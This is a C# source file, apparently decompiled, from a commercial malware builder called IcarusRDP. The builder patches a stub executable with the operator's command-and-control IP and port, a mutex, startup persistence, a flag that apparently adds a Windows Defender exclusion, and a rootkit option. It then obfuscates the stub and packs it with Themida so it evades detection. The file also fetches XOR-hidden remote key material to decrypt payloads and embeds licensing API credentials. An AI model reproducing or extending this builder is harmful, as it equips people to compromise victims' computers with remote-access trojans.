using System;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using IcarusRDP_builder.KeyAuth;
using IcarusRDP_builder.Properties;
using Microsoft.VisualBasic;
using Mono.Cecil;
using Mono.Cecil.Cil;

namespace IcarusRDP_builder
{
    internal class BuildFile
    {
        public static api KeyAuthApp = new api("Icarus Private", "k7Rf9MY5MS", "f3c8f16f543191bbbce178c325533e5875874bb1b897a73bdb9c282312da5705", "2.7");

        private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

        private static readonly Random random = new Random();

        public static async void Build(string netversion, string ip, string port, string mutex, string startup, string wdex, string rootkit, string watcher)
        {
            KeyAuthApp.init();
            KeyAuthApp.license(watcher);
            if (!KeyAuthApp.response.success)
            {
                return;
            }
            Random random = new Random();
            string[] array = new string[3] { "0", "1", "2" };
            int num = random.Next(0, 3);
            _ = array[num];
            string text = "ICARUS";
            string operand = Convert.ToString(port);
            string operand2 = "Icarus_Bot";
            string operand3 = mutex + getRandomCharacters();
            getRandomCharacters();
            _ = getRandomCharacters() + ".exe";
            if (netversion.Contains("net2"))
            {
                try
                {
                    AssemblyDefinition assemblyDefinition = AssemblyDefinition.ReadAssembly(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\Stub\\net2.exe");
                    foreach (TypeDefinition type in assemblyDefinition.MainModule.Types)
                    {
                        if (!type.ToString().Contains("Program"))
                        {
                            continue;
                        }
                        foreach (MethodDefinition method in type.Methods)
                        {
                            if (!method.ToString().Contains("Main"))
                            {
                                continue;
                            }
                            foreach (Mono.Cecil.Cil.Instruction instruction in method.Body.Instructions)
                            {
                                if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "%IP%")
                                {
                                    instruction.Operand = ip;
                                }
                                if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "%PORT%")
                                {
                                    instruction.Operand = operand;
                                }
                                if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "%ID%")
                                {
                                    instruction.Operand = operand2;
                                }
                                if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "%MUTEX%")
                                {
                                    instruction.Operand = operand3;
                                }
                                if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "%STARTUP%")
                                {
                                    instruction.Operand = startup;
                                }
                                if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "%WDEX%")
                                {
                                    instruction.Operand = wdex;
                                }
                                if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "%WATCH%")
                                {
                                    instruction.Operand = "True";
                                }
                                if (rootkit.Contains("True") && instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "%KAR%")
                                {
                                    instruction.Operand = "True";
                                }
                            }
                        }
                    }
                    string path = Program.buildserverpath + "\\" + text;
                    if (!Directory.Exists(path))
                    {
                        Directory.CreateDirectory(path);
                    }
                    string fileName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\" + text + "\\Client.exe".Replace("Client.exe", "Stub.exe");
                    assemblyDefinition.Write(fileName);
                    assemblyDefinition.Dispose();
                    while (!File.Exists(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\" + text + "\\Stub.exe"))
                    {
                        Console.WriteLine("Encrypting Stub!");
                    }
                    ModuleDefMD moduleDefMD;
                    ModuleDefMD moduleDefMD2 = (moduleDefMD = ModuleDefMD.Load(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\" + text + "\\Stub.exe"));
                    using (moduleDefMD)
                    {
                        moduleDefMD2 = Obfuscate.obfuscate(moduleDefMD2);
                    }
                    moduleDefMD2.Write(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\" + text + "\\Stub4.exe");
                    moduleDefMD2.Dispose();
                    SaveSettings();
                    File.Delete(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\" + text + "\\Stub.exe");
                }
                catch (Exception ex)
                {
                    Exception ex2 = ex;
                    File.WriteAllText("buildfile.txt", ex2.ToString());
                    Application.Exit();
                }
            }
            else
            {
                if (!netversion.Contains("net4"))
                {
                    return;
                }
                try
                {
                    AssemblyDefinition assemblyDefinition2 = AssemblyDefinition.ReadAssembly(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\Stub\\net4.exe");
                    foreach (TypeDefinition type2 in assemblyDefinition2.MainModule.Types)
                    {
                        if (!type2.ToString().Contains("Program"))
                        {
                            continue;
                        }
                        foreach (MethodDefinition method2 in type2.Methods)
                        {
                            if (!method2.ToString().Contains("Main"))
                            {
                                continue;
                            }
                            foreach (Mono.Cecil.Cil.Instruction instruction2 in method2.Body.Instructions)
                            {
                                if (instruction2.OpCode.ToString() == "ldstr" && instruction2.Operand.ToString() == "%IP%")
                                {
                                    instruction2.Operand = ip;
                                }
                                if (instruction2.OpCode.ToString() == "ldstr" && instruction2.Operand.ToString() == "%PORT%")
                                {
                                    instruction2.Operand = operand;
                                }
                                if (instruction2.OpCode.ToString() == "ldstr" && instruction2.Operand.ToString() == "%ID%")
                                {
                                    instruction2.Operand = operand2;
                                }
                                if (instruction2.OpCode.ToString() == "ldstr" && instruction2.Operand.ToString() == "%MUTEX%")
                                {
                                    instruction2.Operand = operand3;
                                }
                                if (instruction2.OpCode.ToString() == "ldstr" && instruction2.Operand.ToString() == "%STARTUP%")
                                {
                                    instruction2.Operand = startup;
                                }
                                if (instruction2.OpCode.ToString() == "ldstr" && instruction2.Operand.ToString() == "%WDEX%")
                                {
                                    instruction2.Operand = wdex;
                                }
                                if (instruction2.OpCode.ToString() == "ldstr" && instruction2.Operand.ToString() == "%WATCH%")
                                {
                                    instruction2.Operand = "False";
                                }
                                if (rootkit.Contains("True"))
                                {
                                    if (instruction2.OpCode.ToString() == "ldstr" && instruction2.Operand.ToString() == "%KAR%")
                                    {
                                        instruction2.Operand = "True";
                                    }
                                }
                                else if (instruction2.OpCode.ToString() == "ldstr" && instruction2.Operand.ToString() == "%KAR%")
                                {
                                    instruction2.Operand = "False";
                                }
                            }
                        }
                    }
                    string path2 = Program.buildserverpath + "\\" + text;
                    if (!Directory.Exists(path2))
                    {
                        Directory.CreateDirectory(path2);
                    }
                    string fileName2 = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\" + text + "\\Client.exe".Replace("Client.exe", "Stub.exe");
                    assemblyDefinition2.Write(fileName2);
                    assemblyDefinition2.Dispose();
                    while (!File.Exists(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\" + text + "\\Stub.exe"))
                    {
                        Console.WriteLine("Encrypting Stub!");
                    }
                    ModuleDefMD moduleDefMD;
                    ModuleDefMD moduleDefMD4 = (moduleDefMD = ModuleDefMD.Load(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\" + text + "\\Stub.exe"));
                    using (moduleDefMD)
                    {
                        moduleDefMD4 = Obfuscate.obfuscate(moduleDefMD4);
                    }
                    moduleDefMD4.Write(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\" + text + "\\Stub4.exe");
                    moduleDefMD4.Dispose();
                    SaveSettings();
                    File.Delete(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\" + text + "\\Stub.exe");
                }
                catch (Exception ex)
                {
                    Exception ex3 = ex;
                    File.WriteAllText(Application.StartupPath + "\\buildfile.txt", ex3.ToString());
                    Application.Exit();
                }
            }
        }

        private static async Task crypter()
        {
            string text = "C:\\xampp\\htdocs\\crypt\\public\\crypt_files\\Themida.exe";
            string text2 = "C:\\xampp\\htdocs\\crypt\\public\\IcarusRDP_builder\\ICARUS\\Stub.exe";
            string text3 = "C:\\xampp\\htdocs\\crypt\\public\\IcarusRDP_builder\\ICARUS\\Stub.exe";
            string text4 = "C:\\xampp\\htdocs\\crypt\\public\\json_files\\Icarus.tmd";
            string path = "C:\\xampp\\htdocs\\crypt\\public\\IcarusRDP_builder\\ICARUS\\";
            while (!File.Exists(text3))
            {
                Console.WriteLine("Encrypting Stub!");
            }
            Interaction.Shell(text + " /protect " + text4 + " /inputfile " + text2 + " /outputfile " + text3, AppWinStyle.Hide, Wait: true);
            string[] files = Directory.GetFiles(path, "*.bak");
            string[] array = files;
            foreach (string path2 in array)
            {
                File.Delete(path2);
            }
        }

        public static void SaveSettings()
        {
            try
            {
                Settings.Default.Save();
            }
            catch
            {
            }
        }

        private static void WriteSettings(ModuleDefMD asmDef)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    if (!(type.Name == "Program"))
                    {
                        continue;
                    }
                    foreach (MethodDef method in type.Methods)
                    {
                        if (method.Body == null)
                        {
                            continue;
                        }
                        for (int i = 0; i < method.Body.Instructions.Count(); i++)
                        {
                            if (method.Body.Instructions[i].OpCode != dnlib.DotNet.Emit.OpCodes.Ldstr)
                            {
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings: " + ex.Message);
            }
        }

        private static string reupload(string str)
        {
            char c = '\n';
            StringBuilder stringBuilder = new StringBuilder();
            char[] array = str.ToCharArray();
            foreach (uint num in array)
            {
                char value = (char)(num ^ c);
                stringBuilder.Append(value);
            }
            return stringBuilder.ToString();
        }

        public static string Decrypt(string encrypted)
        {
            string arg = reupload("mbzUA==c}Xe:oM8\u007f9Sl\\r^8\u007f}YIRifDH|<;oeNPm");
            string requestUri = reupload("b~~zy0%%xk}$mc~b\u007fh\u007fyoxied~od~$ieg%MenEl]kxoLkxo%~boye\u007fxio%gkcd%c|$~r~5~eaod7MBYK^:KKKKKKH^<O]EB>D8B=ZO9DS_KZG\\IS^CIN?K");
            string requestUri2 = reupload("b~~zy0%%xk}$mc~b\u007fh\u007fyoxied~od~$ieg%MenEl]kxoLkxo%~boye\u007fxio%gkcd%aos$~r~5~eaod7MBYK^:KKKKKKH^<O]EBHO<NBG^?LNO@LZ8OS^B\\EBK");
            using HttpClient httpClient = new HttpClient();
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
            string s = string.Format(CultureInfo.InvariantCulture, "{0}:", arg);
            s = Convert.ToBase64String(Encoding.ASCII.GetBytes(s));
            httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", s);
            string result = httpClient.GetStringAsync(requestUri).Result;
            string s2 = result;
            string s3 = string.Format(CultureInfo.InvariantCulture, "{0}:", arg);
            s3 = Convert.ToBase64String(Encoding.ASCII.GetBytes(s3));
            httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", s3);
            string result2 = httpClient.GetStringAsync(requestUri2).Result;
            string s4 = result2;
            byte[] array = Convert.FromBase64String(encrypted);
            AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
            aesCryptoServiceProvider.BlockSize = 128;
            aesCryptoServiceProvider.KeySize = 256;
            aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(s4);
            aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(s2);
            aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
            aesCryptoServiceProvider.Mode = CipherMode.CBC;
            ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
            byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
            cryptoTransform.Dispose();
            return Encoding.ASCII.GetString(bytes);
        }

        public static string getRandomCharacters()
        {
            StringBuilder stringBuilder = new StringBuilder();
            for (int i = 1; i <= new Random().Next(10, 20); i++)
            {
                int index = random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length);
                stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[index]);
            }
            return stringBuilder.ToString();
        }
    }
}
